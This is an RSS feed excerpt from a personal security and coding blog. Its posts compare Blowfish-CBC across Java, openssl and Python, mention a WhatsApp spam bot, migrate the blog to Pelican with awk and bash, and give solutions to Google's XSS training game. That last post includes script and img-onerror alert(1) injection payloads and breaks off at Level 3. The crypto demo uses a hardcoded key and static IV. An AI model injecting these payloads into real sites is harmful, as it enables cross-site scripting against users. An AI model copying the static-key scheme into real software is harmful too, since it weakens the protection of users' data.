        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;KEY:\t &#34;</span> + bytesToHex(key));
        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;IV:\t &#34;</span> + bytesToHex(IV.<span style="color:#bbb">getBytes</span>()));

        <span style="color:#999;font-style:italic">// Create new Blowfish cipher
</span><span style="color:#999;font-style:italic"></span>        SecretKeySpec keySpec = <span style="color:#6ab825;font-weight:bold">new</span> SecretKeySpec(key, <span style="color:#ed9d13">&#34;Blowfish&#34;</span>);
        Cipher cipher = Cipher.<span style="color:#bbb">getInstance</span>(<span style="color:#ed9d13">&#34;Blowfish/CBC/PKCS5Padding&#34;</span>);
        String out = <span style="color:#6ab825;font-weight:bold">null</span>;

        <span style="color:#6ab825;font-weight:bold">if</span> ( mode.<span style="color:#bbb">equals</span>(<span style="color:#ed9d13">&#34;-e&#34;</span>) )
        {
            String secret = args[1];
            cipher.<span style="color:#bbb">init</span>(Cipher.<span style="color:#bbb">ENCRYPT_MODE</span>, keySpec, <span style="color:#6ab825;font-weight:bold">new</span> javax.<span style="color:#bbb">crypto</span>.<span style="color:#bbb">spec</span>.<span style="color:#bbb">IvParameterSpec</span>(IV.<span style="color:#bbb">getBytes</span>()));
            <span style="color:#6ab825;font-weight:bold">byte</span>[] encoding = cipher.<span style="color:#bbb">doFinal</span>(secret.<span style="color:#bbb">getBytes</span>());

            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;-- Encrypted -----------&#34;</span>);
            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;Base64:\t &#34;</span> + DatatypeConverter.<span style="color:#bbb">printBase64Binary</span>(encoding));
            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;HEX:\t &#34;</span> + bytesToHex(encoding));
        }
        <span style="color:#6ab825;font-weight:bold">else</span>
        {
            <span style="color:#999;font-style:italic">// Decode Base64
</span><span style="color:#999;font-style:italic"></span>            <span style="color:#6ab825;font-weight:bold">byte</span>[] ciphertext = DatatypeConverter.<span style="color:#bbb">parseBase64Binary</span>(args[1]);

            <span style="color:#999;font-style:italic">// Decrypt
</span><span style="color:#999;font-style:italic"></span>            cipher.<span style="color:#bbb">init</span>(Cipher.<span style="color:#bbb">DECRYPT_MODE</span>, keySpec, <span style="color:#6ab825;font-weight:bold">new</span> javax.<span style="color:#bbb">crypto</span>.<span style="color:#bbb">spec</span>.<span style="color:#bbb">IvParameterSpec</span>(IV.<span style="color:#bbb">getBytes</span>()));
            <span style="color:#6ab825;font-weight:bold">byte</span>[] message = cipher.<span style="color:#bbb">doFinal</span>(ciphertext);

            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;-- Decrypted -----------&#34;</span>);
            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;HEX:\t &#34;</span> + bytesToHex(message));
            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;PLAIN:\t &#34;</span> + <span style="color:#6ab825;font-weight:bold">new</span> String(message));

        }
    }
}
</code></pre></div><p>The programm will encrypt messages using <em>Blowfish</em> in <em>CBC</em> mode. There are 2 modi available:</p>
<ul>
<li><code>-e &lt;message&gt;</code>: will encrypt the message &lt; message &gt;</li>
<li><code>-d &lt;Base64&gt;</code>: will decrypt the specified Base64 string &lt; Base64 &gt;</li>
</ul>
<p>The encryption <code>key</code> and the <code>IV</code> (initialization vector) are static. Let&rsquo;s see an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># javac JBlowfish.java</span>
<span style="color:#999;font-style:italic"># java -cp . JBlowfish -e secretmessage</span>
-- Settings -----------
KEY:     <span style="color:#3677a9">736563726574</span>
IV:      <span style="color:#3677a9">3132333435363738</span>
-- Encrypted -----------
Base64:  <span style="color:#40ffff">2CEndW0AA2xpsYz3XrXnrA</span>==
HEX:     D82127756D00036C69B18CF75EB5E7AC
</code></pre></div><p>We just <em>encrypted</em> the message <em>&ldquo;secretmessage</em>&rdquo; with <em>Blowfish/CBC</em>. In the <em>settings</em> section you&rsquo;ll see the <code>KEY</code> and the <code>IV</code> in their <em>hex</em> representation. Afterwards the programm will show the <code>Base64</code> and the <code>hex</code> representation of <strong>encrypted</strong> message. <em>Decryption</em> works quite straightforward:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># java -cp . JBlowfish -d 2CEndW0AA2xpsYz3XrXnrA==</span>
-- Settings -----------
KEY:     <span style="color:#3677a9">736563726574</span>
IV:      <span style="color:#3677a9">3132333435363738</span>
-- Decrypted -----------
HEX:     7365637265746D657373616765
PLAIN:   secretmessage
</code></pre></div><p>Our little Java application does its job pretty fine. Ok, now let&rsquo;s have a look at <code>openssl</code>.</p>
<h2 id="openssl---java">OpenSSL &lt;-&gt; Java</h2>
<p>Using <code>openssl</code> I&rsquo;ll encrypt/decrypt the previous secret message with the same cipher:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># echo &#34;secretmessage&#34; | openssl bf-cbc -nosalt -a -pass pass:victor -iv 3132333435363738 -p</span>
<span style="color:#40ffff">key</span>=FFC150A160D37E92012C196B6AF4160D
<span style="color:#40ffff">iv</span> =<span style="color:#3677a9">3132333435363738</span>
+NtBjHQzii7i//apIvfHkw==
</code></pre></div><p>A few explanations:</p>
<ul>
<li><code>bf-cbc</code>: this is Blowfish with CBC</li>
<li><code>nosalt</code>: Use no salt (which in general is very bad!)</li>
<li><code>-a</code>: This means that if encryption is taking place the data is base64 encoded after encryption. If decryption is set then the input data is base64 decoded before being decrypted.</li>
<li><code>-pass</code>: Specify the passphrase to encrypt the message with. This is actually <strong>not</strong> the encryption key openssl will use. The encryption key will be derived from the passphrase.</li>
<li><code>-iv</code>: Specify IV in hex representation. In the Java code I&rsquo;ve used <code>IV=&quot;12345678</code> and <code>hex(IV)=3132333435363738</code></li>
</ul>
<p>As you can see the output of <em>openssl</em> looks quite different. Following observations:</p>
<table>
<thead>
<tr>
<th>Tool</th>
<th>KEY</th>
<th>IV</th>
<th>Encrypted message (Base64)</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Java</em></td>
<td>736563726574</td>
<td>3132333435363738</td>
<td>2CEndW0AA2xpsYz3XrXnrA==</td>
</tr>
<tr>
<td><em>openssl</em></td>
<td>FFC150A160D37E92012C196B6AF4160D</td>
<td>3132333435363738</td>
<td>+NtBjHQzii7i//apIvfHkw==</td>
</tr>
</tbody>
</table>
<p>Besides the IV everything looks different :(</p>
<h2 id="python---java">Python &lt;-&gt; Java</h2>
<p>Let&rsquo;s also have a look at <em>Python</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#3677a9">67</span>]:    <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> Blowfish
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto</span> <span style="color:#6ab825;font-weight:bold">import</span> Random
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">struct</span> <span style="color:#6ab825;font-weight:bold">import</span> pack
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">binascii</span> <span style="color:#6ab825;font-weight:bold">import</span> hexlify, unhexlify


            IV = <span style="color:#ed9d13">&#34;12345678&#34;</span>
            KEY = <span style="color:#ed9d13">&#34;secret&#34;</span>

            <span style="color:#999;font-style:italic"># We&#39;ll use the Base64 string from JBlowfish output</span>
            ciphertext = <span style="color:#ed9d13">&#34;2CEndW0AA2xpsYz3XrXnrA==&#34;</span>.decode(<span style="color:#ed9d13">&#34;base64&#34;</span>)

            cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)
            message = cipher.decrypt(ciphertext)
            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;KEY: &#34;</span> + KEY.encode(<span style="color:#ed9d13">&#34;hex&#34;</span>))
            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;IV: &#34;</span> + IV.encode(<span style="color:#ed9d13">&#34;hex&#34;</span>))
            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Message: &#34;</span> + message)

Out:        KEY: <span style="color:#3677a9">736563726574</span>
            IV: <span style="color:#3677a9">3132333435363738</span>
            Message: secretmessage<span style="color:#a61717;background-color:#e3d2d2"></span>
</code></pre></div><p>Well that looks good. This is what we got:</p>
<table>
<thead>
<tr>
<th>Tool</th>
<th style="text-align:center">KEY</th>
<th style="text-align:right">IV</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Java</em></td>
<td style="text-align:center">736563726574</td>
<td style="text-align:right">3132333435363738</td>
</tr>
<tr>
<td><em>python</em></td>
<td style="text-align:center">736563726574</td>
<td style="text-align:right">3132333435363738</td>
</tr>
</tbody>
</table>
<h2 id="python---openssl">Python &lt;-&gt; openssl</h2>
<p>This time let&rsquo;s encrypt some message using Python:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#3677a9">71</span>]:    <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> Blowfish
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto</span> <span style="color:#6ab825;font-weight:bold">import</span> Random
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">struct</span> <span style="color:#6ab825;font-weight:bold">import</span> pack
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">binascii</span> <span style="color:#6ab825;font-weight:bold">import</span> hexlify, unhexlify


            IV = <span style="color:#ed9d13">&#34;12345678&#34;</span>
            KEY = <span style="color:#ed9d13">&#34;secret&#34;</span>
            message = <span style="color:#ed9d13">&#34;12345678&#34;</span>


            cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)
            ciphertext = cipher.encrypt(message)
            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;HEX: &#34;</span> + ciphertext.encode(<span style="color:#ed9d13">&#34;hex&#34;</span>))
            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Base64: &#34;</span> + ciphertext.encode(<span style="color:#ed9d13">&#34;base64&#34;</span>))

Out:        HEX: <span style="color:#3677a9">010</span>a0d9149750a32
            Base64: AQoNkUl1CjI=
</code></pre></div><p>Now decrypt that ciphertext using openssl:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># echo &#34;AQoNkUl1CjI=&#34; | openssl bf-cbc -d -a -nosalt -pass pass:secret -iv 3132333435363738  -p</span>
<span style="color:#40ffff">key</span>=5EBE2294ECD0E0F08EAB7690D2A6EE69
<span style="color:#40ffff">iv</span> =<span style="color:#3677a9">3132333435363738</span>
bad decrypt
140568446580392:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:evp_enc.c:539:
</code></pre></div><p>Again the encryption key doesn&rsquo;t match the one we used in the Python code. Thus the Bas64 string can&rsquo;t be decoded by openssl.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Obviously I&rsquo;m not the <a href="http://stackoverflow.com/questions/8468799/decrypting-openssl-blowfish-with-java">only one</a> facing this problem.</p>
<blockquote>
<p><a href="http://juliusdavies.ca/commons-ssl/pbe.html">Not-Yet-Commons-SSL</a> has an implementation of PBE (&ldquo;password based encryption&rdquo;) that is 100% compatible with OpenSSL&rsquo;s command-line &ldquo;enc&rdquo; utility</p>
</blockquote>
<p>That sounds promising but you should be warned:</p>
<blockquote>
<p>Warning:  All versions of not-yet-commons-ssl should be considered to be of &ldquo;Alpha&rdquo; quality! This code probably contains bugs. This code may have security issues.</p>
</blockquote>
<p>as stated <a href="http://juliusdavies.ca/commons-ssl/download.html">here</a>.</p>
<p>If you still want some compatibility between <code>openssl</code> and your code, you should use the <code>key</code> and <code>IV</code> from openssl. Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># echo &#34;this-is-secret&#34; | openssl bf-cbc -a -nosalt -pass pass:secret -iv 12345678 -p</span>
<span style="color:#40ffff">key</span>=5EBE2294ECD0E0F08EAB7690D2A6EE69
<span style="color:#40ffff">iv</span> =<span style="color:#3677a9">1234567800000000</span>
<span style="color:#40ffff">2whDyIn5hRdyXpRZbMZayw</span>==
</code></pre></div><p>Now use those values in your code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#3677a9">72</span>]:    <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Cipher</span> <span style="color:#6ab825;font-weight:bold">import</span> Blowfish
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto</span> <span style="color:#6ab825;font-weight:bold">import</span> Random
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">struct</span> <span style="color:#6ab825;font-weight:bold">import</span> pack
            <span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">binascii</span> <span style="color:#6ab825;font-weight:bold">import</span> hexlify, unhexlify


            KEY = unhexlify(<span style="color:#ed9d13">&#34;5EBE2294ECD0E0F08EAB7690D2A6EE69&#34;</span>)
            IV = unhexlify(<span style="color:#ed9d13">&#34;1234567800000000&#34;</span>)
            ciphertext = <span style="color:#ed9d13">&#34;2whDyIn5hRdyXpRZbMZayw==&#34;</span>.decode(<span style="color:#ed9d13">&#34;base64&#34;</span>)


            cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)
            ciphertext = cipher.decrypt(ciphertext)

            <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;Message: &#34;</span> + message)

Out:        Message: <span style="color:#3677a9">12345678</span>
</code></pre></div><p>Also have a look at <a href="http://stackoverflow.com/questions/12227510/how-to-decrypt-unsalted-openssl-compatible-blowfish-cbc-pkcs5padding-password-in">this</a>. That&rsquo;s all for today. Cya next time!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>WhatsApp bot</title>
      <link>https://blog.dornea.nu/2014/06/29/whatsapp-bot/</link>
      <pubDate>Sun, 29 Jun 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/06/29/whatsapp-bot/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2014/9435906d7dc8d3f01b92cebc191eb9ab.png" alt=""></p>
<p>This is what I&rsquo;ve received yesterday from some phone number I don&rsquo;t really know. BTW: Which countrys prefix is that? The crazy thing about it: Every time I was sending a message to it, it responded with:</p>
<blockquote>
<p>Thank you. We have received your message.</p>
</blockquote>
<p>I had a look at the video sent and it seems to belong to some local club here in town. I was receiving some SPAM SMS from them but this time it was sth new. And besides that: Is that a WhatsApp bot?! Does anybody have seen sth similar before?!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Migrate this blog from Octopress to Pelican</title>
      <link>https://blog.dornea.nu/2014/06/18/migrate-this-blog-from-octopress-to-pelican/</link>
      <pubDate>Wed, 18 Jun 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/06/18/migrate-this-blog-from-octopress-to-pelican/</guid>
      <content:encoded><![CDATA[<p>A few weeks ago I&rsquo;be migrated my whole blog from Wordpress to Octopress. Meanwhile I&rsquo;ve discovered <code>Pelican</code> which is the Pythonic alternative to Octopress. To be honest: The main reason I&rsquo;m using Pelican instead of Octopress is the ability to import/include <code>IPython notebooks</code>.</p>
<p>After I&rsquo;ve set up my blog using Octopress I only had a bunge of <code>Markdown</code> files. So let&rsquo;s get started.</p>
<h2 id="generate-metadata-for-content">Generate metadata for content</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cp ~/work/blog/octopress/source/_posts/*.markdown ~/work/blog/pelican/content/markdown/
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ls -c ~/work/blog/pelican/content/markdown/ | head -n <span style="color:#3677a9">10</span>
</code></pre></div><pre><code>2014-05-27-berlinsides-0x05.markdown
2014-06-02-googles-xss-game-solutions.markdown
2014-05-20-howto-write-pentest-reports-the-easy-way.markdown
2014-05-15-test2.markdown
2014-01-31-links-of-the-week-25-2.markdown
2014-02-07-links-of-the-week-26.markdown
2014-02-14-links-of-the-week-27.markdown
2014-03-07-unfancy-dashboard-using-matplotlib.markdown
2014-05-04-howto-create-docs-with-sphinx.markdown
2014-01-23-24h-android-sniffing-using-tcpdump.markdown
</code></pre>
<h2 id="awk-script-for-doing-the-main-job">AWK script for doing the main job</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%%writefile ~/work/blog/pelican/content/transform.awk
{
    # Date
    if ( $0 ~ /^date(.*)$/ ) {
        # Get date
        match($0, /^date: ([0-9]{4}\-[0-9]{2}\-[0-9]{2}).*$/, ary)
        print &#34;Date: &#34; ary[1]; 

    # Title 
    } else if ( $0 ~ /^title(.*)$/) {
        match($0, /^title: (.*)$/, ary)

        # Remove single/double quotes
        gsub(/&#39;/, &#34;&#34;, ary[1]);
        gsub(/&#34;/, &#34;&#34;, ary[1]);
        print &#34;Title: &#34; ary[1];

    # Author
    } else if ( $0 ~ /^author(.*)$/) {
        match($0, /^author: (.*)$/, ary)
        print &#34;Author: &#34; ary[1];

    # Handle available categories as tags
    } else if ($0 ~ /^categories:.*$/) {
        printf &#34;Tags: &#34;
        
        # Array index
        i = 0;

        # Read next line until new meta tag is found
        while ((getline line ) &gt; 0) {
            # Read until new meta tag is found
            if ((line !~ /^.*\-.*$/) || (line ~ /^\-\-\-$/)) {
                output_string = &#34;&#34;
                # Print categories and the next exit loop
                for (j=0; j&lt;i; j++)
                    
                    # Is this the last category
                    if (j+1 &lt; i) 
                        output_string = output_string tolower(categories[j]) &#34;, &#34;

                    # Last category
                    else
                        output_string = output_string tolower(categories[j])
       
                # Remove last &#34;,&#34; and add default category
                printf &#34;%s\n&#34;, output_string
                printf &#34;Category: blog\n\n&#34;
                break
            }

            # Extract category
            match(line, /^.*\- (.*)$/, ary)
            categories[i] = ary[1]

            # Increase index
            i++;
        }

    }
}

</code></pre></div><pre><code>Overwriting /home/victor/work/blog/pelican/content/transform.awk
</code></pre>
<h2 id="extract-the-metdata-and-generate-the-meta-files">Extract the metdata and generate the meta files</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/
<span style="color:#6ab825;font-weight:bold">for</span> i in content/markdown/*.markdown; <span style="color:#6ab825;font-weight:bold">do</span> 
    cat <span style="color:#40ffff">$i</span> | gawk -f content/transform.awk &gt; <span style="color:#40ffff">$i</span>-meta
<span style="color:#6ab825;font-weight:bold">done</span>

ls -c content/markdown/*-meta | head -n <span style="color:#3677a9">10</span>
</code></pre></div><pre><code>content/markdown/blogging-with-the-ipython-notebook-example.markdown-meta
content/markdown/2014-06-02-googles-xss-game-solutions.markdown-meta
content/markdown/2014-05-27-berlinsides-0x05.markdown-meta
content/markdown/2014-05-20-howto-write-pentest-reports-the-easy-way.markdown-meta
content/markdown/2014-05-15-test2.markdown-meta
content/markdown/2014-05-04-howto-create-docs-with-sphinx.markdown-meta
content/markdown/2014-03-07-unfancy-dashboard-using-matplotlib.markdown-meta
content/markdown/2014-02-14-links-of-the-week-27.markdown-meta
content/markdown/2014-02-07-links-of-the-week-26.markdown-meta
content/markdown/2014-01-31-links-of-the-week-25-2.markdown-meta
</code></pre>
<h2 id="sample-meta-data-output">Sample meta data output</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash

find ~/work/blog/pelican/content/markdown/*-meta -name <span style="color:#ed9d13">&#34;2014-05-*&#34;</span> -exec cat {} <span style="color:#ed9d13">\;</span>
</code></pre></div><pre><code>Title: HowTo: Create docs with sphinx
Author: Victor
Date: 2014-05-04
Tags: coding, howto
Category: blog

Title: Test2
Date: 2014-05-15
Tags: 
Category: blog

Title: HowTo: Write pentest reports the easy way
Date: 2014-05-20
Tags: 
Category: blog

Title: BerlinSides 0x05
Date: 2014-05-27
Tags: events, hacking, security
Category: blog
</code></pre>
<h2 id="delete-old-metadata">Delete old metadata</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/content/markdown
<span style="color:#6ab825;font-weight:bold">for</span> i in *.markdown; <span style="color:#6ab825;font-weight:bold">do</span>
    cat <span style="color:#40ffff">$i</span> | sed <span style="color:#ed9d13">&#39;/^---$/,/^---$/d&#39;</span> &gt; <span style="color:#40ffff">$i</span>-sed
<span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><h2 id="insert-new-metadata-info-file">Insert new metadata info file</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/content/markdown
<span style="color:#6ab825;font-weight:bold">for</span> i in *.markdown; <span style="color:#6ab825;font-weight:bold">do</span>
    cat <span style="color:#40ffff">$i</span>-meta &gt; <span style="color:#40ffff">$i</span>-final; cat <span style="color:#40ffff">$i</span>-sed &gt;&gt; <span style="color:#40ffff">$i</span>-final;
<span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><h2 id="sample-final-output">Sample final output</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/content/markdown
find . -name <span style="color:#ed9d13">&#34;2014-05*.markdown-final&#34;</span> -exec head -n <span style="color:#3677a9">10</span> {} <span style="color:#ed9d13">\;</span>
</code></pre></div><pre><code>Title: Test2
Date: 2014-05-15
Tags: 
Category: blog



# Motivation

I've started this little project since I was mainly interested in the data my
Title: HowTo: Create docs with sphinx
Author: Victor
Date: 2014-05-04
Tags: coding, howto
Category: blog


In this post I&amp;#8217;d like to show some handy way to improve your process of documentating your project.
Since we all know documentation is a **must** you might have wondered how to handle that
without any big efforts. In fact it would be great if you could write your code along with the
Title: HowTo: Write pentest reports the easy way
Date: 2014-05-20
Tags: 
Category: blog


In this post I'll try to share an idea I've had regarding pentest reports. Most of you surely have
their own methods and tools to create nice looking reports after have done some pentesting.
Since I try to keep things simple I'll give you a rough idea how this could be done without Excel &amp; Co.

Title: BerlinSides 0x05
Date: 2014-05-27
Tags: events, hacking, security
Category: blog


The [**BerlinSides**](http://berlinsides.org/) is a conference from hacker for hacker. This years motto was: **...you ain't listening**.
All my greetings go to:

* [nullsecurity.net](http://nullsecurity.net)
</code></pre>
<h2 id="replace-some-strings">Replace some strings</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/content/markdown

<span style="color:#999;font-style:italic"># Insert some dummy text for missing attributes in img tags</span>
<span style="color:#6ab825;font-weight:bold">for</span> i in *.markdown-final; <span style="color:#6ab825;font-weight:bold">do</span>
    sed -i <span style="color:#ed9d13">&#39;s/alt=\&#34;\&#34;/alt=\&#34;image description\&#34;/g&#39;</span> <span style="color:#40ffff">$i</span>
<span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><h2 id="rename-files-and-delete-bullshit">Rename files and delete bullshit</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/content/markdown
rm *.markdown-sed
rm *.markdown-meta
rm *.markdown

<span style="color:#6ab825;font-weight:bold">for</span> i in *.markdown-final; <span style="color:#6ab825;font-weight:bold">do</span>
    mv <span style="color:#40ffff">$i</span> <span style="color:#ed9d13">`</span>basename <span style="color:#40ffff">$i</span> <span style="color:#ed9d13">&#34;.markdown-final&#34;</span><span style="color:#ed9d13">`</span>.markdown
<span style="color:#6ab825;font-weight:bold">done</span>

</code></pre></div><h2 id="generate-new-content">Generate new content</h2>
<p>Supposing you have already setup your pelican blog now you can run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> ~/work/blog/pelican/

<span style="color:#24909d">source</span> env/bin/activate
make html
</code></pre></div><pre><code>pelican /home/victor/work/blog/pelican/content -o /home/victor/work/blog/pelican/output -s /home/victor/work/blog/pelican/pelicanconf.py 

 ** Writing styles to _nb_header.html: this should be included in the theme. **

Done: Processed 124 articles and 1 pages in 6.38 seconds.
</code></pre>
<h2 id="the-end">The End</h2>
<p>I hope you have enjoyed this one. If you have any questions regarding the process, don&rsquo;t hesitate and leave a comment.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Googles XSS Game - Solutions</title>
      <link>https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</link>
      <pubDate>Mon, 02 Jun 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</guid>
      <content:encoded><![CDATA[<p>These are my steps how I&rsquo;ve solved the <a href="https://xss-game.appspot.com/">XSS Game</a></p>
<h2 id="level-1">Level 1</h2>
<p>This is the most obvious and easiest one. Just insert following code and you&rsquo;re done:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;script&gt;alert(<span style="color:#3677a9">1</span>)&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
</code></pre></div><h2 id="level-2">Level 2</h2>
<p>Since the <code>script</code> won&rsquo;t work you&rsquo;ll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use <code>img</code> tags along with the <code>onerror</code> attributes. Here you go:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;img src=<span style="color:#ed9d13">&#34;http://inexist.ent&#34;</span> onerror=<span style="color:#ed9d13">&#34;javascript:alert(1)&#34;</span>/&gt;
</code></pre></div><h2 id="level-3">Level 3</h2>
<p>Well this time I had to read some code in order to understand the applications logic. If you toggle the code you&rsquo;ll see <code>index.html</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
      <span style="color:#6ab825;font-weight:bold">function</span> chooseTab(num) {
        <span style="color:#999;font-style:italic">// Dynamically load the appropriate image.
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> html = <span style="color:#ed9d13">&#34;Image &#34;</span> + <span style="color:#24909d">parseInt</span>(num) + <span style="color:#ed9d13">&#34;&lt;br&gt;&#34;</span>;
        html += <span style="color:#ed9d13">&#34;&lt;img src=&#39;https://blog.dornea.nu/static/level3/cloud&#34;</span> + num + <span style="color:#ed9d13">&#34;.jpg&#39; /&gt;&#34;</span>;
        $(<span style="color:#ed9d13">&#39;#tabContent&#39;</span>).html(html);
[...]
</code></pre></div><p>As you see the <code>num</code> parameter is used to generate the <code>img</code> tag. The ideas was to break-out the quotes and insert some sneaky javascript code. Again I&rsquo;ve used the <code>onerror</code> attribute to insert JS. Insert this into the URL address bar and you&rsquo;ll get your <code>alert()</code>:</p>
